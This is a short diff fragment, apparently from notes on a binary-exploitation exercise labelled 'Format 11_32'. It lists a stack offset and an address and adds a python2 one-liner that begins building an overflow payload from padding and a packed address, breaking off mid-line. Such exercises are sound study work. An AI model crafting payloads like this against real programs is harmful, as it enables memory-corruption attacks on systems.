@@ -23,3 +23,5 @@ Format 11_32
 ebp-20
 
 0x8049276
+
+python2 -c "print 'a'*20 + '\x00\x53\x5c\x59' + 'a'*12 + 
